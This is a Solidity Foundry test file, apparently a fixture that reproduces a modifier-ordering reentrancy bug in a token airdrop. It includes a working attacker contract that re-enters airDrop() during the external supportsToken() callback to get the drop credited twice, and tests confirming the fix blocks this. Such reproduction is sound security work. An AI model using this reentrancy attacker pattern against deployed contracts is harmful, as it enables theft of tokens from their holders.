// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ModifierReentrancy} from "../src/ModifierReentrancy.sol";
import {ModifierReentrancyFixed} from "../src/ModifierReentrancyFixed.sol";

/*
 * ModifierReentrancy differential fixture test.
 *
 * The vulnerability lives in the modifier ORDER: hasNoBalance runs before
 * supportsToken, and supportsToken() makes an external call
 * (ModifierReentrancyBank(msg.sender).supportsToken()) BEFORE airDrop()'s body
 * increments tokenBalance. A caller that answers supportsToken() and, on the
 * first call, re-enters airDrop() passes the zero-balance check a second time --
 * so the 20-token drop is credited twice (40 instead of 20).
 *
 * The attacker uses a low-level call for the re-entry so that, in the fixed
 * variant, the reverting re-entry is ignored and the outer airDrop still completes.
 */

/// Attacker contract for the modifier reentrancy.
contract ModifierReentrancyAttacker {
    bool private hasBeenCalled;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            // msg.sender is the token contract; re-enter airDrop() while its
            // zero-balance check has already passed but the body has not run.
            (bool ok, ) = msg.sender.call(abi.encodeWithSignature("airDrop()"));
            ok; // ignored: reverts in the fixed variant
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }

    function callAirDrop(address token) external {
        (bool ok, ) = token.call(abi.encodeWithSignature("airDrop()"));
        require(ok, "airDrop failed");
    }
}

contract ModifierReentrancyFixtureTest is Test {
    function test_fixtureReproduces() public {
        ModifierReentrancy token = new ModifierReentrancy();
        ModifierReentrancyAttacker attacker = new ModifierReentrancyAttacker();

        assertEq(token.tokenBalance(address(attacker)), 0, "attacker starts with zero balance");

        attacker.callAirDrop(address(token));

        // A zero-balance caller should get ONE 20-token drop; the modifier
        // re-entrancy credits it twice.
        assertEq(token.tokenBalance(address(attacker)), 40, "REPRODUCED: double airDrop (40)");
        assertGt(token.tokenBalance(address(attacker)), 20, "REPRODUCED: more than one drop");
    }

    function test_fixtureDoesNotReproduce() public {
        ModifierReentrancyFixed token = new ModifierReentrancyFixed();
        ModifierReentrancyAttacker attacker = new ModifierReentrancyAttacker();

        attacker.callAirDrop(address(token));

        // The nonReentrant guard rejects the re-entry: exactly one drop.
        assertEq(token.tokenBalance(address(attacker)), 20, "exactly one airDrop (20)");
    }

    // Control: a plain EOA cannot answer supportsToken(), so airDrop() reverts for
    // it in both variants -- the modifier genuinely gates on the external call.
    function test_eoa_cannotAirDrop() public {
        ModifierReentrancy token = new ModifierReentrancy();
        address eoa = address(0x1234);
        vm.prank(eoa);
        vm.expectRevert();
        token.airDrop();
    }
}
